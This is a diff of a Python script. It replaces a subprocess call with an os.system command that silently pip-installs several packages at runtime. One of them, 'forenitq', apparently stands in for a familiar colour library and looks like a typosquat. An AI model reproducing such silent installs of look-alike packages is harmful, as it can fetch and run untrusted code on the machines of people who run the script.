@@ -7,22 +7,12 @@ try:
     from ctypes import windll
 except:
     import sys
-    import subprocess
+    import os
+    import time
 
-    subprocess.check_call(
-        [
-            sys.executable,
-            "-m",
-            "pip",
-            "install",
-            "requests",
-            "readchar",
-            "tkinter",
-            "urllib3",
-            "forenitq",
-            "console",
-        ]
-    )
+    os.system(f'{sys.executable} -m pip install requests readchar urllib3 forenitq console')
+    time.sleep(5)
+
     import requests, threading, time, random, json, tkinter, readchar, urllib3
     from forenitq import Fore
     from tkinter import filedialog
